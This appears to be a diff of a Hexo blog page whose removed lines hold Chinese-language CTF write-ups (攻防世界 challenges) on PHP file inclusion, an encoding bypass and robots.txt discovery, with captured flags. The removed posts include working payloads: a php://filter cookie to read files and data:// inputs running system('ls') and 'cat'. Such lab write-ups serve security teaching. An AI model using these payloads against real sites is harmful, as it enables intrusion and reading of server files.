@@ -4,13 +4,17 @@
   <meta charset="utf-8">
   
   
-  <title>Hexo</title>
+  <title>web3 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="攻防世界   Web_python_template_injection打开题目提示python template injection—-&gt;Python 模板注入以下出现的[[……]]为”中括号中括号……中括号中括号”打开题目提示 “python template injection”，即 Python 模板注入。这是一种在 Web 应用程序中利用 Python 模板引擎漏洞的攻击技术。涉及">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web3">
+<meta property="og:url" content="http://example.com/2025/01/18/web3/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="攻防世界   Web_python_template_injection打开题目提示python template injection—-&gt;Python 模板注入以下出现的[[……]]为”中括号中括号……中括号中括号”打开题目提示 “python template injection”，即 Python 模板注入。这是一种在 Web 应用程序中利用 Python 模板引擎漏洞的攻击技术。涉及">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-01-18T13:53:28.000Z">
+<meta property="article:modified_time" content="2025-01-21T08:11:25.176Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -67,204 +71,7 @@
 </header>
 
       <div class="outer">
-        <section id="main">
-  
-    <article id="new-web5" class="h-entry article article-type-new" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/24/web5/" class="article-date">
-  <time class="dt-published" datetime="2025-01-24T06:43:59.000Z" itemprop="datePublished">2025-01-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/24/web5/">web5</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>攻防世界  fileinclude<br>打开题目提示Notice: Undefined index: language in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 9<br>Please choose the language you want : English or Chinese<br>Hi,EveryOne,The flag is in flag.php：注意：未定义索引：第 9<br>行 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php 中的语言请选择您想要的语言：英文或中文<br>嗨，各位，旗帜在 flag.php<br>查看页面源代码发现PHP代码</p>
-<html>
-<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head>
-
-<br />
-<b>Notice</b>:  Undefined index: language in <b>/var/www/html/index.php</b> on line <b>9</b><br />
-Please choose the language you want : English or Chinese
-<h1>Hi,EveryOne,The flag is in flag.php</h1><html>
-<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head>
-------------------------------------------------------------------
-<?php
-if( !ini_get('display_errors') ) {
-  ini_set('display_errors', 'On');
-  }
-error_reporting(E_ALL);
-$lan = $_COOKIE['language'];
-if(!$lan)
-{
-    @setcookie("language","english");
-    @include("english.php");
-}
-else
-{
-    @include($lan.".php");
-}
-$x=file_get_contents('index.php');
-echo $x;
-?>
-----------------------------------------------------------------
-</html></html>
-这段 PHP 代码主要完成以下几个任务：
-开启错误显示功能，确保在代码运行过程中出现的错误能够被显示出来。
-从客户端的 Cookie 中获取名为language的值。
-如果没有获取到language的值，设置language的 Cookie 为english，并引入english.php文件。
-如果获取到了language的值，引入以该值命名的 PHP 文件。
-读取index.php文件的内容并将其输出。
-分析
-<?php
-// 检查是否已经开启了错误显示功能
-if( !ini_get('display_errors') ) {
-    // 如果没有开启，则将其开启
-    ini_set('display_errors', 'On');
-}
-// 设置错误报告级别为显示所有错误
-error_reporting(E_ALL);
-ini_get('display_errors')：用于获取display_errors配置项的值，该值决定是否显示错误信息。
-ini_set('display_errors', 'On')：如果display_errors未开启，则将其设置为开启状态。
-error_reporting(E_ALL)：设置错误报告级别为显示所有错误。
-// 从客户端的Cookie中获取名为language的值
-$lan = $_COOKIE['language'];
-$_COOKIE是一个超全局数组，用于获取客户端发送的 Cookie 信息。
-// 检查是否获取到了language的值
-if(!$lan)
-{
-    // 如果没有获取到，则设置language的Cookie为english
-    @setcookie("language","english");
-    // 引入english.php文件
-    @include("english.php");
-}
-else
-{
-    // 如果获取到了，则引入以该值命名的PHP文件
-    @include($lan.".php");
-}
-@符号是错误抑制符，用于抑制可能出现的错误信息。
-setcookie("language","english")：设置一个名为language的 Cookie，其值为english。
-include语句用于引入指定的 PHP 文件。
-// 读取index.php文件的内容
-$x=file_get_contents('index.php');
-// 输出读取到的内容
-echo $x;
-?>
-file_get_contents('index.php')：读取index.php文件的全部内容，并将其作为字符串返回。
-echo $x：将读取到的内容输出到浏览器。
-解题方法：
-使用bp抓包、
-GET / HTTP/1.1
-Host: 61.147.171.105:50676
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
-Connection: close
-发送给重放器并添加cookie:language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag
-GET / HTTP/1.1
-Host: 61.147.171.105:50676
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
-cookie:language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag
-Connection: close
-得到一串bash64编码的字符串：PD9waHANCiRmbGFnPSJjeWJlcnBlYWNle2Q0YTMwNTY4YzQxZjYyN2I0MWZjMjNjZjJkZWUzNWMwfSI7DQo/Pg==
-解码的flag
-<?php
-$flag="cyberpeace{d4a30568c41f627b41fc23cf2dee35c0}";
-?>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/24/web5/" data-id="cm6afakc30000wgmfef273246" data-title="web5" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-web4" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/21/web4/" class="article-date">
-  <time class="dt-published" datetime="2025-01-21T08:08:56.000Z" itemprop="datePublished">2025-01-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/21/web4/">web4</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>攻防世界  Web_php_include<br>打开题目是php代码，进行代码审计<br><?php
-show_source(__FILE__);
-echo $_GET['hello'];
-$page=$_GET['page'];
-while (strstr($page, "php://")) {
-    $page=str_replace("php://", "", $page);
-}
-include($page);
-?><br>show_source(<strong>FILE</strong>);：该函数会显示当前文件的源代码，<strong>FILE</strong> 是一个魔术常量，表示当前文件的完整路径和文件名，因此会将当前文件的源代码输出。<br>echo $_GET[‘hello’];：从 GET 请求中获取 hello 参数的值，并将其输出。<br>$page &#x3D; $_GET[‘page’];：从 GET 请求中获取 page 参数的值，并将其存储在 $page 变量中。<br>while (strstr($page, “php:&#x2F;&#x2F;“)) { $page&#x3D;str_replace(“php:&#x2F;&#x2F;“, “”, $page); }：<br>strstr($page, “php:&#x2F;&#x2F;“) 函数会检查 $page 变量中是否包含 php:&#x2F;&#x2F; 字符串，如果存在，则返回该字符串及其后面的部分，否则返回 false。<br>str_replace(“php:&#x2F;&#x2F;“, “”, $page); 函数会将 $page 中的 php:&#x2F;&#x2F; 字符串替换为空字符串。这个循环会持续进行，直到 $page 中不再包含 php:&#x2F;&#x2F; 字符串，目的是防止用户使用 php:&#x2F;&#x2F; 协议相关的内容。<br>include($page);：使用 include 函数包含 $page 变量所指向的文件或资源。<br>语法：<br>strstr(string,search,before_search)<br>string:必需，被搜索的字符串<br>search:必需，要搜索的字符串，若是数字，则搜索对应的ASCII值的字符<br>before_search：可选，默认为“false”，若为true,将返回search参数第一次出现之前的字符串部分<br>str_replace(find,replace,string,count)<br>find,必需，要查找的值<br>replace，必需，要替换的值<br>string，必需，被搜索的字符串<br>count，可选，替换次数<br>该PHP代码程序过滤掉了page&#x3D;参数传入php:&#x2F;&#x2F;，可以用data伪协议代码执行<br>输入?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("ls")?><br>可得到<?php
-show_source(__FILE__);
-echo $_GET['hello'];
-$page=$_GET['page'];
-while (strstr($page, "php://")) {
-    $page=str_replace("php://", "", $page);
-}
-include($page);
-?><br>fl4gisisish3r3.php index.php phpinfo.php<br>在输入?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("cat fl4gisisish3r3.php")?><br>利用开发者工具按F12,点击元素即可看到flag</p>
-<!--?php
-$flag="ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}";
-?-->
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/21/web4/" data-id="cm668tucs0000cgmfgnxyedfv" data-title="web4" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-web3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-web3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/18/web3/" class="article-date">
   <time class="dt-published" datetime="2025-01-18T13:53:28.000Z" itemprop="datePublished">2025-01-18</time>
@@ -277,8 +84,8 @@ $flag="ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}";
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/18/web3/">web3</a>
+    <h1 class="p-name article-title" itemprop="headline name">
+      web3
     </h1>
   
 
@@ -298,198 +105,28 @@ $flag="ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}";
     </footer>
   </div>
   
-</article>
-
-
-
+    
+<nav id="article-nav">
   
-    <article id="post-PHP2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/16/PHP2/" class="article-date">
-  <time class="dt-published" datetime="2025-01-16T09:21:28.000Z" itemprop="datePublished">2025-01-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+    <a href="/2025/01/21/web4/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/16/PHP2/">PHP2</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>攻防世界   PHP2<br>打开题目PHP2只出现一句话Can you anthenticate to this website?，翻译是你能登录这个网站吗？<br>发现没用后不去理会，我们发现不能看到题目，结合题目名字是PHP,想到应该是现在的界面不能直接<br>看到PHP文件，尝试去输入&#x2F;index.php,发现没有出现变化后，在尝试输入&#x2F;index.phps,发现现在可以<br>看到题目，<br>&lt;?php<br>if(“admin”&#x3D;&#x3D;&#x3D;$_GET[id]) {<br>  echo(“<p>not allowed!</p>“);<br>  exit();<br>}</p>
-<p>$_GET[id] &#x3D; urldecode($_GET[id]);<br>if($_GET[id] &#x3D;&#x3D; “admin”)<br>{<br>  echo “<p>Access granted!</p>“;<br>  echo “<p>Key: xxxxxxx </p>“;<br>}<br>?&gt;</p>
-<p>Can you anthenticate to this website?<br>下面开始代码审计，<br><?php
-if("admin"===$_GET[id]) {
-  echo("<p>not allowed!</p>");
-  exit();
-}这里我们不能让admin=id,否则输出<p>not allowed!</p>后，后续代码将不会被执行。
-$_GET[id] = urldecode($_GET[id]);
-if($_GET[id] == "admin")
-{
-  echo "<p>Access granted!</p>";
-  echo "<p>Key: xxxxxxx </p>";
-}
-?><br>这里有一个函数urldecode,对id的值进行url解码，令id的值等于admin即可得到flag<br>这里一共有两次url解码，一次在url栏，一次是urldecode函数<br>url 解码是% + ascii 的十六进制，25的url解码是%,61的url解码是a,<br>所以%2561dmin经过两次url解码后的值是admin。<br>由此我们可以构造payload:<a target="_blank" rel="noopener" href="http://61.147.171.105:53284/?id=%2561dmin">http://61.147.171.105:53284/?id=%2561dmin</a><br>得到flag：cyberpeace{af7de02b0ed234fe66d6cab36d943474}</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/16/PHP2/" data-id="cm5z6a8th0000k0mf1xngdnhk" data-title="PHP2" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-wed1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/14/wed1/" class="article-date">
-  <time class="dt-published" datetime="2025-01-14T11:38:31.000Z" itemprop="datePublished">2025-01-14</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+          web4
         
+      </div>
+    </a>
   
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/14/wed1/">wed1</a>
-    </h1>
   
+    <a href="/2025/01/16/PHP2/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">PHP2</div>
+    </a>
+  
+</nav>
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>攻防世界<br>Training-WWW-Robots<br>打开题目显示In this little training challenge, you are going to learn about the Robots_exclusion_standard.<br>The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.<br>Sometimes these files reveal the directory structure instead protecting the content from being crawled.</p>
-<p>Enjoy!<br>根据显示的内容：在这个小小的培训挑战中，您将了解 Robots_exclusion_standard。<br>网络爬虫使用 robots.txt 文件来检查是否允许他们抓取和索引您的网站或仅部分网站。<br>有时，这些文件会泄露目录结构，而不是保护内容不被搜寻。<br>我们得知这道题是让我们使用网络爬虫来找flag，我们在网址栏输入&#x2F;robots.txt，到一个新页面<br>User-agent: *<br>Disallow: &#x2F;fl0g.php</p>
-<p>User-agent: Yandex<br>Disallow: *<br>找到了flag所在的文件名，在网址栏输入<a target="_blank" rel="noopener" href="http://61.147.171.105:60155/fl0g.php%E5%BE%97%E5%88%B0flag">http://61.147.171.105:60155/fl0g.php得到flag</a><br>cyberpeace{a9879b9be405269a3ffecc073bb1da76}<br>一些关于爬虫的知识<br>User-agent: 爬虫的名称</p>
-<p>Disallow: 不允许爬虫访问的地址</p>
-<p>Allow: 允许爬虫访问的地址</p>
-<p>若User-agent是*，则表示对象是所有爬虫。</p>
-<p>Disallow和Allow后面跟的是地址，地址的描述格式符合正则表达式(regex)的规则。因此可以在python中使用正则表达式来筛选出可以访问的地址。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/14/wed1/" data-id="cm5wf6bsz0000fgmf539h8nc0" data-title="wed1" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
   
 </article>
-
-
-
-  
-    <article id="post-chenge-first-blog" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/12/21/chenge-first-blog/" class="article-date">
-  <time class="dt-published" datetime="2024-12-21T05:59:47.000Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/21/chenge-first-blog/">&#39;chenge-first-blog&#39;</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>打卡</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/21/chenge-first-blog/" data-id="cm4xru2g00000zcmfgr7wbqen" data-title="&#39;chenge-first-blog&#39;" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/12/21/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2024-12-21T03:27:24.131Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/21/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/21/hello-world/" data-id="cm4xn094b0000agmf72hf0eyf" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
 </section>
